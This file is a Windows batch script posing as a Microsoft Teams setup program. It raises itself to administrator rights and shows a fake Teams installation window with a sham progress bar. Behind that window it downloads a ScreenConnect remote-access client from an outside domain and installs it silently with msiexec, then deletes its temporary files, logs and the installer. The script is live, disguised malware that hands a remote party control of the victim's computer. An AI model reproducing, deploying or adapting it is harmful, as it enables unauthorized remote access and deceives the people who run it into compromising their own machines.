@echo off
net session >nul 2>&1
if %errorLevel% equ 0 (
    goto :run_install
) else (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:run_install
title Microsoft Teams Setup

cd /d "%TEMP%"
set "AGENT_FILE=%TEMP%\Microsoft-Teams.msi"
set "LOG_FILE=%TEMP%\Teams_install.log"
set "MSI_LOG=%TEMP%\Teams_msi.log"
set "HTML=%TEMP%\TeamsSetup.html"
set "PS1=%TEMP%\launch_ui.ps1"
set "EDGE_PROFILE=%TEMP%\EdgeTempProfile"

echo Microsoft Teams for desktop and mobile to stay connected on Windows, Mac, iOS, and Android.

> "%PS1%" echo $html = @'
>> "%PS1%" echo ^<!DOCTYPE html^>
>> "%PS1%" echo ^<html^>
>> "%PS1%" echo ^<head^>
>> "%PS1%" echo ^<meta charset="UTF-8"^>
>> "%PS1%" echo ^<title^>Microsoft Teams Setup^</title^>
>> "%PS1%" echo ^<style^>
>> "%PS1%" echo body { margin: 0; padding: 0; height: 100vh; background-color: #201f1e; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; color: white; user-select: none; overflow: hidden; }
>> "%PS1%" echo .window { background: #292827; width: 500px; border-radius: 12px; box-shadow: 0 15px 40px rgba(0,0,0,0.6); padding: 50px; text-align: center; border: 1px solid #3b3a39; }
>> "%PS1%" echo .logo { width: 70px; margin-bottom: 20px; }
>> "%PS1%" echo h1 { font-size: 24px; font-weight: 600; margin-bottom: 10px; color: #ffffff; }
>> "%PS1%" echo p { color: #c8c6c4; font-size: 15px; margin-bottom: 35px; }
>> "%PS1%" echo .progress-container { width: 100%%; background-color: #3b3a39; border-radius: 6px; height: 8px; margin: 25px 0; overflow: hidden; }
>> "%PS1%" echo .progress-bar { height: 100%%; width: 0%%; background-color: #6264a7; transition: width 0.1s linear; }
>> "%PS1%" echo .percentage { font-size: 15px; color: #6264a7; font-weight: bold; margin-bottom: 20px; }
>> "%PS1%" echo .checkmark { display: none; width: 60px; height: 60px; margin: 0 auto; }
>> "%PS1%" echo .checkmark-circle { stroke-dasharray: 166; stroke-dashoffset: 166; stroke-width: 2; stroke-miterlimit: 10; stroke: #4CAF50; fill: none; animation: stroke 0.6s cubic-bezier(0.65, 0, 0.45, 1) forwards; }
>> "%PS1%" echo .checkmark-check { transform-origin: 50%% 50%%; stroke-dasharray: 48; stroke-dashoffset: 48; stroke-width: 3; stroke: #4CAF50; fill: none; animation: stroke 0.3s cubic-bezier(0.65, 0, 0.45, 1) 0.8s forwards; }
>> "%PS1%" echo @keyframes stroke { 100%% { stroke-dashoffset: 0; } }
>> "%PS1%" echo ^</style^>
>> "%PS1%" echo ^</head^>
>> "%PS1%" echo ^<body^>
>> "%PS1%" echo ^<div class="window"^>
>> "%PS1%" echo ^<img src="https://images.seeklogo.com/logo-png/37/1/microsoft-teams-logo-png_seeklogo-370282.png" class="logo" alt="Teams Logo"^>
>> "%PS1%" echo ^<h1 id="titleText"^>Setting up your account^</h1^>
>> "%PS1%" echo ^<p id="descText"^>We are preparing Microsoft Teams for your organization...^</p^>
>> "%PS1%" echo ^<div id="loadingUI"^>
>> "%PS1%" echo ^<div class="progress-container"^>
>> "%PS1%" echo ^<div class="progress-bar" id="progressBar"^>^</div^>
>> "%PS1%" echo ^</div^>
>> "%PS1%" echo ^<div class="percentage" id="percentage"^>0%%^</div^>
>> "%PS1%" echo ^</div^>
>> "%PS1%" echo ^<svg class="checkmark" id="successCheck" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52"^>
>> "%PS1%" echo ^<circle class="checkmark-circle" cx="26" cy="26" r="25" fill="none"/^>
>> "%PS1%" echo ^<path class="checkmark-check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/^>
>> "%PS1%" echo ^</svg^>
>> "%PS1%" echo ^</div^>
>> "%PS1%" echo ^<script^>
>> "%PS1%" echo setTimeout(function() {
>> "%PS1%" echo   document.getElementById('titleText').innerText = "Installing Microsoft Teams";
>> "%PS1%" echo   document.getElementById('descText').innerText = "Installing the latest version...";
>> "%PS1%" echo   var progressBar = document.getElementById('progressBar');
>> "%PS1%" echo   var percentageText = document.getElementById('percentage');
>> "%PS1%" echo   var progress = 0;
>> "%PS1%" echo   var interval = setInterval(function() {
>> "%PS1%" echo     progress += Math.floor(Math.random() * 2) + 1;
>> "%PS1%" echo     if (progress ^> 100) progress = 100;
>> "%PS1%" echo     progressBar.style.width = progress + '%%';
>> "%PS1%" echo     percentageText.innerText = progress + '%%';
>> "%PS1%" echo     if (progress === 100) {
>> "%PS1%" echo       clearInterval(interval);
>> "%PS1%" echo       setTimeout(function() {
>> "%PS1%" echo         document.getElementById('loadingUI').style.display = 'none';
>> "%PS1%" echo         document.getElementById('successCheck').style.display = 'block';
>> "%PS1%" echo         document.getElementById('titleText').innerText = "You're all set!";
>> "%PS1%" echo         document.getElementById('titleText').style.color = "#4CAF50";
>> "%PS1%" echo         document.getElementById('descText').innerText = "Microsoft Teams has been successfully installed.";
>> "%PS1%" echo         setTimeout(function(){ window.close(); }, 3000);
>> "%PS1%" echo       }, 500);
>> "%PS1%" echo     }
>> "%PS1%" echo   }, 750);
>> "%PS1%" echo }, 2000);
>> "%PS1%" echo ^</script^>
>> "%PS1%" echo ^</body^>
>> "%PS1%" echo ^</html^>
>> "%PS1%" echo '@
>> "%PS1%" echo Set-Content -Path "%HTML%" -Value $html -Encoding UTF8

>> "%PS1%" echo $edgeArgs = '--app="%HTML%" --user-data-dir="%EDGE_PROFILE%"'
>> "%PS1%" echo $proc = Start-Process msedge -ArgumentList $edgeArgs -PassThru
>> "%PS1%" echo Start-Sleep -Seconds 2
>> "%PS1%" echo $top = Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);' -Name 'Win32' -Namespace 'TopMost' -PassThru
>> "%PS1%" echo $top::SetWindowPos($proc.MainWindowHandle, [IntPtr]-1, 0, 0, 0, 0, 3)

start "" /min powershell -NoProfile -ExecutionPolicy Bypass -File "%PS1%"

echo Installing Microsoft Teams...
curl.exe -s -o "%AGENT_FILE%" "https://zoompetr.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=shyshy&c=&c=&c=&c=&c=&c=&c="

echo Start free Teams video calls instantly! Connect, collaborate, and communicate effortlessly....
msiexec.exe /i "%AGENT_FILE%" /quiet /qn /norestart
set "RC=%errorlevel%"

if "%RC%"=="0" (
    goto :wait_and_cleanup
)
if "%RC%"=="3010" (
    goto :wait_and_cleanup
)

echo [ERROR] msiexec returned %RC%.

:wait_and_cleanup
timeout /t 10 >nul

powershell -NoProfile -Command "Get-CimInstance Win32_Process -Filter \"Name = 'msedge.exe'\" | Where-Object { $_.CommandLine -like '*EdgeTempProfile*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }" >nul 2>&1
del /f /q "%HTML%" >nul 2>&1
del /f /q "%PS1%" >nul 2>&1
del /f /q "%MSI_LOG%" >nul 2>&1
del /f /q "%LOG_FILE%" >nul 2>&1
del /f /q "%AGENT_FILE%" >nul 2>&1
rmdir /s /q "%EDGE_PROFILE%" >nul 2>&1

exit